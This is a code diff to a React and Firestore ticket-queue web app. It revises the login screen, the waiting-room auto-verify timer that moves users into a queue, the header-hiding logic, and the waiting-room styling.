@@ -87,7 +87,7 @@ export default function UserApp() {
             setIsLoading(false); 
         } else { 
             setUser(u); 
-            // If logged in, send to Home (skips auth)
+            // If logged in, check session state but default to home
             if(currentPage === 'auth') {
                 await findOrCreateSession(u);
                 setCurrentPage('home');
@@ -128,15 +128,15 @@ export default function UserApp() {
       }
   };
 
-  // --- AUTO-VERIFY (5 Seconds) - ONLY DB UPDATE ---
+  // --- AUTO-VERIFY (5 Seconds) ---
   useEffect(() => {
     if (currentPage === 'waiting_room' && currentSessionId) {
       const timer = setTimeout(async () => {
-        // Only update DB. Let the snapshot listener handle the redirect.
         await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), {
            accessGranted: 'allowed',
            status: 'in_queue'
         });
+        setCurrentPage('queue'); // Force move to Queue immediately
       }, 5000);
       return () => clearTimeout(timer);
     }
@@ -183,6 +183,7 @@ export default function UserApp() {
     return () => { unsubSettings(); unsubEvents(); };
   }, [user]);
 
+  // --- QUEUE ---
   useEffect(() => {
       if (currentPage === 'queue') {
           const interval = setInterval(() => {
@@ -221,13 +222,16 @@ export default function UserApp() {
   const updateSession = (updates) => { if(currentSessionId) updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), updates); };
   
   const filteredEvents = eventsList.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
+  
+  // Header Logic
+  const hideHeader = currentPage === 'auth' || currentPage === 'waiting_room';
 
   if (isLoading) return <div className="min-h-screen bg-[#0a0e14] flex items-center justify-center"><div className="w-12 h-12 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" /></div>;
 
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
-      {!user && currentPage === 'auth' ? null : currentPage === 'waiting_room' ? null : (
+      {!hideHeader && (
         <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
             <div className="flex items-center gap-3 z-20">
                 {currentPage !== 'home' && <button onClick={() => setCurrentPage('home')} className="p-2 rounded-full hover:bg-white/10 active:scale-95 transition-all"><ChevronLeft className="w-5 h-5" /></button>}
@@ -253,18 +257,20 @@ export default function UserApp() {
         </header>
       )}
 
+      {/* MAIN CONTENT */}
       <main className={`min-h-screen ${
           currentPage === 'auth' ? 'bg-[#0a0e14]' : 
           currentPage === 'waiting_room' ? 'bg-[#0a0e14]' : 
           'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto bg-[#0a0e14] text-gray-100'
       }`}>
         
+        {/* AUTH */}
         {currentPage === 'auth' && (
            <div className="fixed inset-0 z-[100] bg-[#0a0e14] flex items-center justify-center p-4">
               <div className="bg-white text-black w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6 relative z-50">
                  <div className="text-center">
-                    <h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup' ? (txt?.verifyTitle || "Create Account") : (txt?.loginTitle || "Welcome Back")}</h2>
-                    <p className="text-xs font-bold text-gray-600 uppercase tracking-widest">{authMode==='signup' ? (txt?.verifySub || "Verify Identity") : (txt?.loginSub || "Log in to enter")}</p>
+                    <h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup' ? "Create Account" : "Welcome Back"}</h2>
+                    <p className="text-xs font-bold text-gray-600 uppercase tracking-widest">{authMode==='signup' ? "Verify Identity" : "Log in to enter"}</p>
                  </div>
                  <div className="space-y-3">
                      {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
@@ -274,13 +280,14 @@ export default function UserApp() {
                  </div>
                  {authError && <p className="text-center text-red-500 font-bold text-xs">{authError}</p>}
                  <button onClick={authMode === 'signup' ? handleRealSignup : handleRealLogin} disabled={authLoading} className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg flex items-center justify-center gap-3">
-                     {authLoading ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" /> : (authMode === 'signup' ? (txt?.btnJoin || "Join") : (txt?.btnLogin || "Log In"))}
+                     {authLoading ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" /> : (authMode === 'signup' ? "Join" : "Log In")}
                  </button>
-                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-600 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? (txt?.haveAcc || "Have Account?") : (txt?.noAcc || "Create Account")}</button></div>
+                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-600 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? "Have Account?" : "Create Account"}</button></div>
               </div>
            </div>
         )}
 
+        {/* HOME */}
         {currentPage === 'home' && (
           <div className="space-y-10 animate-fadeIn">
             <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
@@ -291,22 +298,24 @@ export default function UserApp() {
           </div>
         )}
 
+        {/* WAITING ROOM (Visible Background + Dark Theme) */}
         {currentPage === 'waiting_room' && (
            <div className="fixed inset-0 z-[100] bg-[#0a0e14] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn">
-               {/* Fixed Background Image using Static URL to ensure background image always shows */}
+               
+               {/* Background Image (Static Hardcoded for Reliability) */}
                <div className="absolute inset-0 z-0">
                   <img 
                     src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" 
-                    className="w-full h-full object-cover opacity-30 blur-2xl scale-110" 
+                    className="w-full h-full object-cover opacity-50 blur-sm scale-110" 
                   />
-                  <div className="absolute inset-0 bg-gradient-to-b from-black/80 via-[#0a0e14]/90 to-black/80" />
+                  <div className="absolute inset-0 bg-gradient-to-b from-black/40 via-[#0a0e14]/60 to-black/40" />
                </div>
                
                <div className="relative z-10 flex flex-col items-center space-y-8">
                    <div className="w-20 h-20 border-4 border-[#22c55e] border-t-transparent rounded-full animate-spin z-10" />
                    <div className="space-y-2">
                        <h2 className="text-3xl font-black italic uppercase tracking-tighter text-white">{txt?.holdTitle}</h2>
-                       <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt?.holdSub}</p>
+                       <p className="text-sm font-bold text-gray-200 uppercase tracking-widest drop-shadow-md">{txt?.holdSub}</p>
                    </div>
                    <div className="bg-[#1f262d]/80 backdrop-blur-xl p-6 rounded-2xl border border-white/10 max-w-sm shadow-2xl">
                        <p className="text-xs font-bold text-gray-500">Session ID: <span className="text-white font-mono">{currentSessionId?.slice(0,8)}...</span></p>
